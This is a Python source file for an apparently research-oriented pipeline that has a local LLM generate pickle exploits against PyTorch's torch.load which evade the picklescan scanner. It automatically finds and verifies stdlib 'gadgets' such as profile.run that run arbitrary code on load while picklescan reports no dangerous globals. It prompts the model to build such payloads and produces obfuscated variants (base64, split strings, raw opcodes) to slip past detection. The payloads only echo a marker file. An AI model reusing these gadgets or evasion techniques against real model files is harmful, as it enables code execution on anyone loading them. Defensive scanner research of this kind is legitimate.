#!/usr/bin/env python3
import argparse
import ast
import json
import os
import pickle
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

current_script_dir = Path(__file__).resolve().parent
search_root = current_script_dir.parent
files_to_find = ['rag_tool_ollama.py', 'interact_with_ollama.py']
for filename in files_to_find:
    found_files = list(search_root.rglob(filename))
    if found_files:
        folder_path = str(found_files[0].parent.resolve())
        if folder_path not in sys.path:
            sys.path.insert(0, folder_path)
    else:
        raise FileNotFoundError(f"Could not find '{filename}' anywhere inside the project.")
from interact_with_ollama import call_ollama, check_ollama
from rag_tool_ollama import build_index, retrieve
FRAMEWORK_DIR = Path(__file__).parent.resolve()
CF_DIR = FRAMEWORK_DIR.parent
OUTPUT_DIR = CF_DIR / 'new_outputs' / 'pytorch_outputs' / 'output'
WORK_DIR = OUTPUT_DIR / 'work'
POC_DIR = OUTPUT_DIR / 'POC'
VAR_DIR = OUTPUT_DIR / 'Variant'
LOG_PATH = OUTPUT_DIR / 'run.log'
DATASET_PATH = FRAMEWORK_DIR / 'input.json'
RAG_DOCS_PATH = FRAMEWORK_DIR / 'rag'
OLLAMA_BASE_URL = os.getenv('OLLAMA_BASE_URL', 'http://localhost:11434')
OLLAMA_MODEL = os.getenv('OLLAMA_MODEL', 'llama3.3:70b')
T_SESSIONS = int(os.getenv('T_SESSIONS', '10'))
I_REFINEMENTS = int(os.getenv('I_REFINEMENTS', '5'))
RAG_TOP_K = int(os.getenv('RAG_TOP_K', '3'))
CONDA_ENV = os.getenv('CONDA_ENV', 'vuln_pytorch')
MAX_SYNTAX_RETRIES = 2
ABLATION_NO_RAG = False
ABLATION_NO_REFINE_LOG = False
DEFAULT_ANCHOR_ID = 'GHSA-fqq6-7vqf-w3fg'
MARKER_FILENAME = 'exploit_marker.txt'
_EXEC_DIRECT_NAMES = frozenset({'exec', 'eval', 'compile'})
_SCAN_CONFIG_CACHE = FRAMEWORK_DIR / '.gadget_scan_cache.json'

def log(msg: str) -> None:
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f'[{ts}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a') as fh:
            fh.write(line + '\n')
    except Exception:
        pass
_FILLABLE_PARAM_DEFAULTS: dict = {'globals': '{}', 'locals': '{}', 'globs': "{'__name__': '__main__'}"}

def _build_call_args(non_self: list, exec_param: str, n_required: int) -> Optional[list]:
    args = []
    for i, p in enumerate(non_self):
        if p == exec_param:
            args.append('command')
        elif i < n_required:
            if p not in _FILLABLE_PARAM_DEFAULTS:
                return None
            args.append(_FILLABLE_PARAM_DEFAULTS[p])
    return args

def _build_scan_config() -> tuple:
    import importlib.util
    if _SCAN_CONFIG_CACHE.exists():
        try:
            cached = json.loads(_SCAN_CONFIG_CACHE.read_text())
            return (frozenset(cached['param_names']), cached['scan_modules'])
        except Exception:
            pass
    param_names: set = set()
    scan_modules: list = []
    exec_param_pat = re.compile('^(cmd|code|stmt|statement|source|src|expr|script|prog|f|line)$')
    candidates = sorted(getattr(sys, 'stdlib_module_names', ['cProfile', 'profile', 'timeit', 'trace', 'code', 'doctest', 'pdb']))
    for mod_name in candidates:
        if mod_name.startswith('_'):
            continue
        try:
            spec = importlib.util.find_spec(mod_name)
            if not spec or not spec.origin or (not spec.origin.endswith('.py')):
                continue
            src = Path(spec.origin).read_text(errors='replace')
            if not any((f'{d}(' in src for d in _EXEC_DIRECT_NAMES)):
                continue
            tree = ast.parse(src)
        except Exception:
            continue
        scan_modules.append(mod_name)
        for fn in ast.walk(tree):
            if not isinstance(fn, ast.FunctionDef):
                continue
            if fn.name.startswith('_'):
                continue
            param_names.update((a.arg for a in fn.args.args if a.arg not in ('self', 'cls')))
    filtered_params = frozenset((p for p in param_names if exec_param_pat.match(p)))
    try:
        _SCAN_CONFIG_CACHE.write_text(json.dumps({'param_names': sorted(filtered_params), 'scan_modules': scan_modules}, indent=2))
    except Exception:
        pass
    return (filtered_params, scan_modules)
_EXEC_PARAM_NAMES, _SCAN_MODULES = _build_scan_config()

def _discover_simple_gadgets() -> list:
    import importlib.util
    gadgets: list = []
    seen: set = set()
    for mod_name in _SCAN_MODULES:
        try:
            spec = importlib.util.find_spec(mod_name)
            if not spec or not spec.origin or (not spec.origin.endswith('.py')):
                continue
            tree = ast.parse(Path(spec.origin).read_text(errors='replace'))
        except Exception:
            continue
        for node in tree.body:
            if not isinstance(node, ast.FunctionDef):
                continue
            if node.name.startswith('_'):
                continue
            params = [a.arg for a in node.args.args]
            if params and params[0] in ('self', 'cls'):
                continue
            non_self = [p for p in params if p not in ('self', 'cls')]
            exec_param = next((p for p in non_self if p in _EXEC_PARAM_NAMES), None)
            if not exec_param or non_self.index(exec_param) > 1:
                continue
            n_required = len(non_self) - len(node.args.defaults)
            call_args = _build_call_args(non_self, exec_param, n_required)
            if call_args is None:
                continue
            qual = f'{mod_name}.{node.name}'
            if qual in seen:
                continue
            seen.add(qual)
            args_str = ', '.join(call_args)
            gadgets.append({'name': qual, 'import': f'import {mod_name}', 'return': f'return {qual}, ({args_str},)' if len(call_args) == 1 else f'return {qual}, ({args_str})', 'label': qual})
    return gadgets

def _discover_method_gadgets() -> list:
    import importlib.util
    gadgets: list = []
    seen: set = set()
    for mod_name in _SCAN_MODULES:
        try:
            spec = importlib.util.find_spec(mod_name)
            if not spec or not spec.origin or (not spec.origin.endswith('.py')):
                continue
            tree = ast.parse(Path(spec.origin).read_text(errors='replace'))
        except Exception:
            continue
        for cls_node in tree.body:
            if not isinstance(cls_node, ast.ClassDef):
                continue
            cls_name = cls_node.name
            for node in cls_node.body:
                if not isinstance(node, ast.FunctionDef):
                    continue
                if node.name.startswith('_'):
                    continue
                params = [a.arg for a in node.args.args]
                if not params or params[0] != 'self':
                    continue
                non_self = params[1:]
                exec_param = next((p for p in non_self if p in _EXEC_PARAM_NAMES), None)
                if not exec_param:
                    continue
                n_required = len(non_self) - len(node.args.defaults)
                call_args = _build_call_args(non_self, exec_param, n_required)
                if call_args is None:
                    continue
                qual = f'{mod_name}.{cls_name}.{node.name}'
                if qual in seen:
                    continue
                seen.add(qual)
                instance = f'{cls_name}()'
                all_args = [instance] + call_args
                args_str = ', '.join(all_args)
                gadgets.append({'name': qual, 'import': f'from {mod_name} import {cls_name}', 'return': f'return {cls_name}.{node.name}, ({args_str})', 'label': qual})
    return gadgets

def _gadget_module_name(qual: str) -> tuple:
    parts = qual.split('.')
    return (parts[0], '.'.join(parts[1:]))

def _evades_scanner(module: str, name: str) -> bool:
    try:
        from picklescan.scanner import _unsafe_globals
    except Exception:
        return True
    flt = _unsafe_globals.get(module)
    if flt is None and '.' in module and (_unsafe_globals.get(module.split('.')[0]) == '*'):
        flt = '*'
    if flt is not None and (flt == '*' or name in flt):
        return False
    return True

def _is_picklable(gadget: dict) -> bool:
    ns: dict = {}
    src = f"import pickle\nclass _Probe:\n    def __reduce__(self):\n        {gadget['import']}\n        command = 'echo probe'\n        {gadget['return']}\n"
    try:
        exec(src, ns)
        pickle.dumps(ns['_Probe']())
        return True
    except Exception:
        return False

def _executes_on_load(gadget: dict) -> bool:
    import tempfile
    marker = Path(tempfile.mktemp(suffix='.mk'))
    builder = Path(tempfile.mktemp(suffix='.py'))
    payload = Path(str(builder) + '.pkl')
    command = f"__import__('os').system('echo ok > {marker}')"
    src = f"import pickle, sys\nclass _Probe:\n    def __reduce__(self):\n        {gadget['import']}\n        command = {command!r}\n        {gadget['return']}\nopen(sys.argv[1], 'wb').write(pickle.dumps(_Probe()))\n"
    try:
        builder.write_text(src)
        r = subprocess.run([sys.executable, str(builder), str(payload)], capture_output=True, timeout=15)
        if r.returncode != 0 or not payload.exists():
            return False
        subprocess.run([sys.executable, '-c', f"import pickle; pickle.loads(open({str(payload)!r}, 'rb').read())"], capture_output=True, timeout=15)
        return marker.exists()
    except Exception:
        return False
    finally:
        for p in (marker, builder, payload):
            try:
                p.unlink()
            except Exception:
                pass
_PROVEN_GADGETS_CACHE = FRAMEWORK_DIR / '.proven_gadgets_cache.json'

def _build_gadget_list() -> list:
    if _PROVEN_GADGETS_CACHE.exists():
        try:
            return json.loads(_PROVEN_GADGETS_CACHE.read_text())
        except Exception:
            pass
    candidates = _discover_simple_gadgets() + _discover_method_gadgets()
    proven: list = []
    for g in candidates:
        module, name = _gadget_module_name(g['name'])
        if _evades_scanner(module, name) and _is_picklable(g) and _executes_on_load(g):
            proven.append(g)
    try:
        _PROVEN_GADGETS_CACHE.write_text(json.dumps(proven, indent=2))
    except Exception:
        pass
    return proven
PROVEN_GADGETS: list = _build_gadget_list()
_BASE_SKELETON = '#!/usr/bin/env python3\nimport argparse\nimport pickle\nimport subprocess\nfrom pathlib import Path\n\n\ndef make_payload(marker_path: Path):\n    class Payload:\n        def __reduce__(self):\n            import profile\n            command = f"__import__(\'os\').system(\'echo exploit-PLACEHOLDER > {marker_path}\')"\n            return profile.run, (command,)\n    return Payload()\n\n\ndef run_picklescan(scan_path: Path) -> str:\n    result = subprocess.run(\n        ["picklescan", "-p", str(scan_path)],\n        capture_output=True, text=True, check=False,\n    )\n    return (result.stdout + result.stderr).strip()\n\n\ndef victim_load(scan_path: Path) -> None:\n    import torch\n    torch.load(str(scan_path), weights_only=False)\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description="Controlled PoC for PLACEHOLDER")\n    parser.add_argument("--out-dir",  default="./out")\n    parser.add_argument("--run-load", action="store_true")\n    args = parser.parse_args()\n\n    out_dir      = Path(args.out_dir).resolve()\n    out_dir.mkdir(parents=True, exist_ok=True)\n    payload_path = out_dir / "payload.pkl"\n    marker_path  = out_dir / "exploit_marker.txt"\n\n    print("[+] Building profile.run payload...")\n    payload = make_payload(marker_path)\n    with payload_path.open("wb") as fh:\n        pickle.dump(payload, fh)\n    print(f"[+] Payload written: {payload_path}")\n\n    print("[+] Running picklescan...")\n    summary = run_picklescan(payload_path)\n    print("\\n--- picklescan output ---")\n    print(summary)\n    print("--- end picklescan output ---\\n")\n\n    if "Dangerous globals: 0" in summary:\n        print("[+] Advisory-consistent: picklescan evaded.")\n    else:\n        print("[!] Scanner detected globals; verify picklescan version.")\n\n    if args.run_load:\n        print("[+] Running torch.load() victim path...")\n        victim_load(payload_path)\n        if marker_path.exists():\n            print(f"[+] Marker: {marker_path.read_text().strip()}")\n        else:\n            print("[!] Marker not created.")\n    else:\n        print("[*] Use --run-load to execute payload.")\n\n    return 0\n\n\nif __name__ == "__main__":\n    raise SystemExit(main())\n'

def _base_skeleton(ghsa_id: str) -> str:
    return _BASE_SKELETON.replace('PLACEHOLDER', ghsa_id)

def build_rag_corpus(entries: list) -> dict:
    raw_docs: dict = {}
    for e in entries:
        text = ' '.join(filter(None, [e.get('title', ''), e.get('vulnerable_function', ''), e.get('payload_code', ''), e.get('requirements', ''), e.get('scan_type', ''), e.get('notes', ''), e.get('poc_content', '')]))
        raw_docs[e['id']] = text
    try:
        import torch
        names = [f'torch.{n}' for n in sorted(dir(torch)) if callable(getattr(torch, n, None))]
        raw_docs['__pytorch_config__'] = 'PyTorch callable surface:\n' + '\n'.join(names[:300])
        log(f'[RAG] torch imported: {len(names)} callables enumerated')
    except ImportError:
        raw_docs['__pytorch_config__'] = 'torch.load torch.save torch.nn.Module.__reduce__ torch.serialization.load pickle GLOBAL STACK_GLOBAL'
        log('[RAG] torch not available — static config used')
    corpus = build_index(raw_docs, docs_path=RAG_DOCS_PATH)
    log(f'[RAG] index built: {len(corpus['chunks'])} chunks ({corpus['backend']})')
    return corpus

def format_rag_context(hits: list, all_entries: dict) -> str:
    lines = ['=== RAG Context (k=3, 500-word chunks) ===']
    for doc_id, chunk_text, score in hits:
        lines.append(f'\n--- {doc_id}  sim={score:.3f} ---')
        if doc_id == '__pytorch_config__':
            lines.append(chunk_text[:400])
        elif doc_id in all_entries:
            e = all_entries[doc_id]
            lines.append(f'Title     : {e.get('title', '')}')
            lines.append(f'Vuln Func : {e.get('vulnerable_function', '')}')
            lines.append(f'Payload   : {e.get('payload_code', '')[:200]}')
            lines.append(f'ScanType  : {e.get('scan_type', '')}')
            lines.append(f'Notes     : {e.get('notes', '')}')
        else:
            lines.append(chunk_text[:600])
    lines.append('\n=== End RAG Context ===')
    return '\n'.join(lines)

def _proven_gadget_menu() -> str:
    lines = []
    for g in PROVEN_GADGETS:
        lines.append(f'- {g['label']}: `{g['return'].replace('return ', '')}` (preceded by `{g['import']}`)')
    return '\n'.join(lines) if lines else '- (none discovered)'

def build_poc_prompt(entry: dict, rag_ctx: str, anchor: dict, history: str='') -> str:
    ghsa_id = entry['id']
    vuln_fn = entry.get('vulnerable_function', '<vulnerable_function>')
    history_block = f'\n=== Previous attempt log (last 500 chars) ===\n{history[-500:]}\n=== End log ===\n' if history else ''
    return f"""You are an advanced cybersecurity specialist creating a pickle-based Proof-of-Concept for a security paper.\n\nThe goal is a picklescan BYPASS: the payload must execute code AND make picklescan report `Dangerous globals: 0`. A gadget that picklescan flags (`Dangerous globals: 1`) is a FAILURE even if it executes — picklescan keeps an allowlist/denylist of known-dangerous globals, so you must use a callable it does NOT recognise.\n\n## ICL One-Shot Example (anchor: {DEFAULT_ANCHOR_ID})\nAdvisory  : {anchor.get('title', '')}\nVuln Func : {anchor.get('vulnerable_function', '')}\nTechnique : __reduce__ returns (profile.run, (command,))  — module-level profile.run is not on picklescan's denylist (only profile.Profile.run is), so it evades.\n            where command triggers: echo exploit-{DEFAULT_ANCHOR_ID} > marker_path\n\n{rag_ctx}\n\n## Validated bypass gadgets (auto-discovered, each proven to evade picklescan AND execute)\n{_proven_gadget_menu()}\n\n## Target Advisory: {ghsa_id}\nTitle           : {entry.get('title', '')}\nVulnerable Func : {vuln_fn}\nRequirements    : {entry.get('requirements', '')}\nScan Type       : {entry.get('scan_type', '')}\nNotes           : {entry.get('notes', '')}\n{history_block}\n## Base reproduce.py skeleton (copy ENTIRE structure — ONLY replace make_payload()):\n```python\n{_base_skeleton(ghsa_id)}\n```\n\n## Your task\nReturn a complete reproduce.py where `make_payload()`'s `__reduce__` uses a gadget that EVADES picklescan:\n1. Choose the gadget: you may use any from the validated bypass list above, OR discover your own callable that picklescan does not denylist (avoid os/eval/exec/getattr/builtins/cProfile.run — those are flagged). If a previous attempt was flagged, switch to a different gadget.\n2. command = `f"__import__('os').system('echo exploit-{ghsa_id} > {{marker_path}}')" `\n3. Keep `victim_load()` as `torch.load(str(scan_path), weights_only=False)` — do NOT change\n4. Keep all argparse / main() structure IDENTICAL to the skeleton above\n5. Do NOT use try/except blocks anywhere\n\nOutput ONLY the complete Python code inside a ```python``` block. No explanation.\n""".strip()

def build_variant_prompt(entry: dict, rag_ctx: str, gadget: dict, mutation_type: str='Δfunc', poc_features: Optional[dict]=None) -> str:
    ghsa_id = entry['id']
    features_block = ''
    if poc_features and any(poc_features.values()):
        features_block = f'\n## Verified PoC structure (AST-extracted)\nImports        : {', '.join(poc_features['imports'])}\n__reduce__ call: {poc_features['gadget_call']}\ncommand        : {poc_features['command_structure']}\nreduce args    : {', '.join(poc_features['reduce_args'])}\n'
    mutation_instructions = {'Δfunc': f'Swap gadget to `{gadget['label']}`. `__reduce__` must return `{gadget['return'].replace('return ', '')}`.', 'Δval': f"Use `{gadget['label']}` gadget AND encode the command string using base64: `__import__('base64').b64decode(b'<encoded>').decode()` instead of a plain string literal.", 'Δtype': f'Use `{gadget['label']}` gadget AND pass the command via a bytes object decoded at runtime: `cmd.decode()` where cmd is a bytes literal.', 'Δapi': f'Use `{gadget['label']}` gadget AND build the pickle using raw `pickle.GLOBAL + pickle.MARK + pickle.TUPLE + pickle.REDUCE` opcode bytes instead of pickle.dump where possible in make_payload().', 'Δbyte': f"Use `{gadget['label']}` gadget AND split the echo command string into parts joined at runtime: e.g. `'echo ' + 'exploit-...' + ' > ' + str(marker_path)`."}
    mut_instr = mutation_instructions.get(mutation_type, mutation_instructions['Δfunc'])
    return f"""You are a security researcher creating a pickle PoC variant for {ghsa_id}.\n\n## Mutation type: {mutation_type}\n{mut_instr}{features_block}\n\n## Base reproduce.py (use this EXACT structure — only modify make_payload()):\n```python\n{_base_skeleton(ghsa_id)}\n```\n\n## Required make_payload() for this variant:\n```python\ndef make_payload(marker_path: Path):\n    class Payload:\n        def __reduce__(self):\n            {gadget['import']}\n            command = f"__import__('os').system('echo exploit-{ghsa_id} > {{marker_path}}')"\n            {gadget['return']}\n    return Payload()\n```\n\nRules:\n1. Start from the base skeleton above — keep ALL of main(), argparse, run_picklescan(), victim_load() IDENTICAL\n2. Replace only make_payload() with the required version above, then apply mutation type {mutation_type}\n3. Update print statement to: "[+] Building {gadget['label']} payload..."\n4. --out-dir and --run-load argparse args MUST remain exactly as in skeleton\n5. Do NOT use try/except blocks\n\nOutput ONLY the complete Python code inside a ```python``` block. No explanation.\n""".strip()

def build_fix_prompt(code: str, error: str, ghsa_id: str) -> str:
    return f'Fix this syntax error in the reproduce.py for {ghsa_id}:\n\nError: {error}\n\n```python\n{code}\n```\n\nFix ONLY the syntax error. Return the complete corrected code inside a ```python``` block. No explanation.\n'.strip()

def extract_code(raw: str) -> str:
    m = re.search('```python\\s*\\n(.*?)```', raw, re.DOTALL | re.IGNORECASE)
    if m:
        return m.group(1).strip()
    m = re.search('```\\s*\\n(.*?)```', raw, re.DOTALL)
    if m:
        return m.group(1).strip()
    lines = raw.splitlines()
    start = None
    for i, line in enumerate(lines):
        if line.strip().startswith(('#!/', 'import ', 'from ', 'def ', 'class ')):
            start = i
            break
    if start is None:
        return raw.strip()
    code_lines = lines[start:]
    while code_lines and (not _looks_like_code(code_lines[-1])):
        code_lines.pop()
    return '\n'.join(code_lines).strip()

def _looks_like_code(line: str) -> bool:
    if not line.strip():
        return True
    stripped = line.strip()
    if re.match('^[A-Z][a-z]+ ', stripped) and (not any((c in stripped for c in '=():[]{}#'))):
        return False
    return True

def validate_syntax(code: str) -> tuple:
    try:
        ast.parse(code)
        return (True, 'OK')
    except SyntaxError as e:
        return (False, f'SyntaxError line {e.lineno}: {e.msg}')

def _has_correct_argparse(code: str) -> bool:
    return '--out-dir' in code and '--run-load' in code

def sandbox_run(code: str, ghsa_id: str, attempt_dir: Path) -> tuple:
    script = attempt_dir / 'reproduce.py'
    out_dir = attempt_dir / 'out'
    out_dir.mkdir(parents=True, exist_ok=True)
    script.write_text(code)
    marker = out_dir / MARKER_FILENAME
    if marker.exists():
        marker.unlink()
    cmd = ['conda', 'run', '-n', CONDA_ENV, '--no-capture-output', 'python', str(script), '--run-load', '--out-dir', str(out_dir)]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        output = (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return ('TIMEOUT', 'runtime_error')
    except Exception as exc:
        return (str(exc), 'runtime_error')
    status = memory_classify(output, ghsa_id, out_dir)
    return (output, status)

def memory_classify(output: str, ghsa_id: str, out_dir: Path) -> str:
    marker = out_dir / MARKER_FILENAME
    lower = output.lower()
    evaded = 'dangerous globals: 0' in lower
    executed = marker.exists() and 'exploit-' in marker.read_text()
    if executed and evaded:
        log(f'[Memory] {ghsa_id} → BYPASS SUCCESS — evaded picklescan + executed')
        return 'success'
    if executed and (not evaded):
        log(f'[Memory] {ghsa_id} → executed but picklescan flagged it — not a bypass')
        return 'runtime_error'
    error_keywords = ['error', 'traceback', 'exception', 'typeerror', 'importerror', 'attributeerror', 'nameerror', 'syntaxerror', 'valueerror', 'modulenotfounderror', 'picklingerror']
    if any((kw in lower for kw in error_keywords)):
        return 'runtime_error'
    if 'dangerous globals:' in lower and (not evaded):
        return 'runtime_error'
    return 'no_exploit'

def _get_code_callables(code: str) -> set:
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return set()
    callables: set = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute):
            callables.add(ast.unparse(node))
        elif isinstance(node, ast.Name):
            callables.add(node.id)
    return callables

def extract_poc_features(code: str) -> dict:
    features: dict = {'imports': [], 'gadget_call': '', 'command_structure': '', 'reduce_args': []}
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return features
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            features['imports'].append(ast.unparse(node))
        if isinstance(node, ast.FunctionDef) and node.name == '__reduce__':
            for stmt in node.body:
                if isinstance(stmt, ast.Return):
                    features['gadget_call'] = ast.unparse(stmt.value)
                    if isinstance(stmt.value, ast.Tuple) and stmt.value.elts:
                        features['reduce_args'] = [ast.unparse(e) for e in stmt.value.elts]
                if isinstance(stmt, ast.Assign):
                    for target in stmt.targets:
                        if isinstance(target, ast.Name) and target.id == 'command':
                            features['command_structure'] = ast.unparse(stmt.value)
    return features

def build_feature_query(poc_features: dict, gadget: dict) -> str:
    parts = list(filter(None, [gadget.get('label', ''), gadget.get('name', ''), poc_features.get('gadget_call', ''), poc_features.get('command_structure', ''), ' '.join(poc_features.get('reduce_args', [])), ' '.join(poc_features.get('imports', [])), 'pickle __reduce__ bypass picklescan']))
    return ' '.join(parts)

def reasoning_loop(entry: dict, rag_ctx: str, anchor: dict, t_sessions: int, i_refinements: int, entry_dir: Path) -> Optional[tuple]:
    ghsa_id = entry['id']
    for t in range(t_sessions):
        t_start = time.time()
        log(f'[Reasoning] {ghsa_id} session {t + 1}/{t_sessions} — fresh context')
        history = ''
        for i in range(i_refinements):
            log(f'[Reasoning] {ghsa_id} s={t + 1} refine={i + 1}/{i_refinements}')
            prompt = build_poc_prompt(entry, rag_ctx, anchor, history=history)
            raw = call_ollama(prompt)
            if not raw:
                log(f'[Reasoning] {ghsa_id} Ollama returned nothing — skip')
                time.sleep(1)
                continue
            code = extract_code(raw)
            syntax_ok, syntax_msg = validate_syntax(code)
            for fix_n in range(MAX_SYNTAX_RETRIES):
                if syntax_ok:
                    break
                log(f'[Reasoning] {ghsa_id} syntax error: {syntax_msg} — fix {fix_n + 1}')
                fix_raw = call_ollama(build_fix_prompt(code, syntax_msg, ghsa_id))
                if fix_raw:
                    code = extract_code(fix_raw)
                    syntax_ok, syntax_msg = validate_syntax(code)
            if not syntax_ok:
                log(f'[Reasoning] {ghsa_id} syntax unfixable — skip refine')
                history = f'SyntaxError: {syntax_msg}\nLast code:\n{code[:300]}'
                continue
            attempt_dir = entry_dir / f'poc_s{t + 1}_r{i + 1}'
            output, status = sandbox_run(code, ghsa_id, attempt_dir)
            log(f'[Reasoning] {ghsa_id} s={t + 1} r={i + 1} → {status}')
            for line in output.splitlines():
                if any((k in line for k in ['[+]', '[!]', 'Dangerous', 'Infected', 'Error', 'error', 'Traceback', 'traceback'])):
                    log(f'  | {line}')
            if status == 'success':
                elapsed = time.time() - t_start
                log(f'[Reasoning] {ghsa_id} SUCCESS s={t + 1} r={i + 1} ({elapsed:.1f}s)')
                return (code, attempt_dir)
            if ABLATION_NO_REFINE_LOG:
                history = ''
            else:
                history = f'PoC attempt:\n{code[:400]}\nExec log:\n{output[-500:]}'
                if status == 'runtime_error':
                    log(f'[Reasoning] {ghsa_id} runtime error — feeding log back')
                else:
                    log(f'[Reasoning] {ghsa_id} no exploit — revising')
            time.sleep(0.5)
        elapsed = time.time() - t_start
        log(f'[Reasoning] {ghsa_id} session {t + 1} exhausted ({elapsed:.1f}s)')
    log(f'[Reasoning] {ghsa_id} — budget exhausted (T={t_sessions} × I={i_refinements})')
    return None
_MUTATION_TYPES = ['Δfunc', 'Δval', 'Δtype', 'Δapi', 'Δbyte']

def _pick_gadget(original_code: str, used_pairs: set, mutation_type: str) -> Optional[dict]:
    code_callables = _get_code_callables(original_code)
    for g in PROVEN_GADGETS:
        if (g['name'], mutation_type) not in used_pairs and g['label'] not in code_callables:
            return g
    return None

def _direct_variant(ghsa_id: str, gadget: dict) -> str:
    return _BASE_SKELETON.replace('PLACEHOLDER', ghsa_id).replace('import profile\n            command = f"__import__(\'os\').system(\'echo exploit-' + ghsa_id + ' > {marker_path}\')"\n            return profile.run, (command,)', gadget['import'] + '\n            command = f"__import__(\'os\').system(\'echo exploit-' + ghsa_id + ' > {marker_path}\')"\n            ' + gadget['return']).replace('[+] Building profile.run payload...', f'[+] Building {gadget['label']} payload...')

def generate_variants(entry: dict, verified_poc: str, corpus: dict, all_entries: dict, t_sessions: int, i_refinements: int, entry_dir: Path) -> list:
    ghsa_id = entry['id']
    variants: list = []
    used_pairs: set = set()
    var_num = 1
    poc_features = extract_poc_features(verified_poc)
    log(f'[Variant] {ghsa_id} AST features: gadget={poc_features['gadget_call']!r}')
    for t in range(t_sessions):
        t_start = time.time()
        mutation_type = _MUTATION_TYPES[t % len(_MUTATION_TYPES)]
        gadget = _pick_gadget(verified_poc, used_pairs, mutation_type)
        if gadget is None:
            log(f'[Variant] {ghsa_id} gadget pool exhausted at session {t + 1}')
            break
        log(f'[Variant] {ghsa_id} s={t + 1}/{t_sessions} gadget={gadget['name']} mutation={mutation_type}')
        success_this_session = False
        for i in range(i_refinements):
            log(f'[Variant] {ghsa_id} s={t + 1} refine={i + 1}/{i_refinements}')
            feature_query = build_feature_query(poc_features, gadget)
            variant_hits = retrieve(feature_query, corpus, top_k=RAG_TOP_K, exclude_id=ghsa_id)
            variant_rag_ctx = format_rag_context(variant_hits, all_entries)
            raw = call_ollama(build_variant_prompt(entry, variant_rag_ctx, gadget, mutation_type, poc_features))
            if not raw:
                time.sleep(1)
                continue
            code = extract_code(raw)
            syntax_ok, syntax_msg = validate_syntax(code)
            for _ in range(MAX_SYNTAX_RETRIES):
                if syntax_ok:
                    break
                fix_raw = call_ollama(build_fix_prompt(code, syntax_msg, ghsa_id))
                if fix_raw:
                    code = extract_code(fix_raw)
                    syntax_ok, syntax_msg = validate_syntax(code)
            if not syntax_ok:
                log(f'[Variant] {ghsa_id} syntax unfixable — falling back to direct substitution')
                code = _direct_variant(ghsa_id, gadget)
                syntax_ok, _ = validate_syntax(code)
                if not syntax_ok:
                    continue
            if not _has_correct_argparse(code):
                log(f'[Variant] {ghsa_id} argparse broken — falling back to direct substitution')
                code = _direct_variant(ghsa_id, gadget)
            if gadget['label'] not in code:
                log(f'[Variant] {ghsa_id} gadget not present — skip')
                continue
            attempt_dir = entry_dir / f'variant_{var_num}_s{t + 1}_r{i + 1}'
            output, status = sandbox_run(code, ghsa_id, attempt_dir)
            log(f'[Variant] {ghsa_id} s={t + 1} r={i + 1} → {status}')
            for line in output.splitlines():
                if any((k in line for k in ['[+]', '[!]', 'Dangerous', 'Error', 'error', 'Traceback'])):
                    log(f'  | {line}')
            if status == 'success':
                elapsed = time.time() - t_start
                log(f'[Variant] {ghsa_id} variant {var_num} CONFIRMED mutation={mutation_type} ({elapsed:.1f}s)')
                marker = attempt_dir / 'out' / MARKER_FILENAME
                marker_content = marker.read_text().strip() if marker.exists() else ''
                var_pkl = attempt_dir / 'out' / 'payload.pkl'
                if var_pkl.exists():
                    var_dest = VAR_DIR / ghsa_id / f'variant_{var_num}_payload.pkl'
                    var_dest.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(var_pkl, var_dest)
                    log(f'[Output] {ghsa_id} variant_{var_num} pickle → {var_dest}')
                variants.append({'var_num': var_num, 'gadget': gadget['name'], 'mutation_type': mutation_type, 'session': t + 1, 'refinement': i + 1, 'script': str(attempt_dir / 'reproduce.py'), 'marker': marker_content, 'elapsed_s': round(elapsed, 1)})
                var_num += 1
                success_this_session = True
                break
            time.sleep(0.5)
        used_pairs.add((gadget['name'], mutation_type))
        if not success_this_session:
            log(f'[Variant] {ghsa_id} session {t + 1} failed')
    return variants

def process_entry(entry: dict, corpus: dict, all_entries: dict, anchor: dict, t_sessions: int, i_refinements: int) -> dict:
    ghsa_id = entry['id']
    entry_dir = WORK_DIR / ghsa_id
    entry_dir.mkdir(parents=True, exist_ok=True)
    log(f'\n{'━' * 62}\n[Entry] {ghsa_id}\n{'━' * 62}')
    entry_start = time.time()
    query = ' '.join(filter(None, [entry.get('vulnerable_function', ''), entry.get('title', ''), entry.get('scan_type', ''), entry.get('notes', '')]))
    if ABLATION_NO_RAG:
        rag_ctx = ''
        log(f'[Planner] {ghsa_id} RAG disabled (ablation)')
    else:
        hits = retrieve(query, corpus, top_k=RAG_TOP_K, exclude_id=ghsa_id)
        rag_ctx = format_rag_context(hits, all_entries)
        log(f'[Planner] {ghsa_id} RAG hits: {[h[0] for h in hits]}')
    result = reasoning_loop(entry, rag_ctx, anchor, t_sessions, i_refinements, entry_dir)
    poc_elapsed = time.time() - entry_start
    if result is None:
        log(f'[Entry] {ghsa_id} — no PoC found ({poc_elapsed:.1f}s)')
        return {'ghsa_id': ghsa_id, 'status': 'NO_POC', 'poc_elapsed_s': round(poc_elapsed, 1), 'var_elapsed_s': 0, 'total_elapsed_s': round(poc_elapsed, 1), 'variants': []}
    verified_poc, poc_dir = result
    marker_path = poc_dir / 'out' / MARKER_FILENAME
    marker_content = marker_path.read_text().strip() if marker_path.exists() else ''
    log(f'[Entry] {ghsa_id} — PoC OK in {poc_elapsed:.1f}s | marker: {marker_content}')
    poc_pkl = poc_dir / 'out' / 'payload.pkl'
    if poc_pkl.exists():
        poc_dest = POC_DIR / ghsa_id / 'payload.pkl'
        poc_dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(poc_pkl, poc_dest)
        log(f'[Output] {ghsa_id} PoC pickle → {poc_dest}')
    var_start = time.time()
    variants = generate_variants(entry, verified_poc, corpus, all_entries, t_sessions, i_refinements, entry_dir)
    var_elapsed = time.time() - var_start
    total_elapsed = time.time() - entry_start
    log(f'[Entry] {ghsa_id} — {len(variants)} variant(s) in {var_elapsed:.1f}s | total {total_elapsed:.1f}s')
